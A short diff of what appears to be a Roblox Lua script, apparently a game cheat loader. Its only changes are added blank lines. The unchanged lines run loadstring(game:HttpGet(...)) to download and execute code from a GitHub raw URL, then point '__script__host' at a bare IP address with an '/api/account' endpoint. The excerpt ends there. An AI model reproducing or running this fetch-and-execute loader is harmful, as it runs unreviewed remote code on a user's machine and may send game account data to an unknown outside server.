@@ -1,5 +1,7 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ooboor005/SC_Raw/refs/heads/main/SC_BF_Mik"))()
+
 task.wait(60)
+
 task.spawn(function()
 repeat task.wait() until game:IsLoaded()
 __script__host = "http://45.136.254.74/api/account"
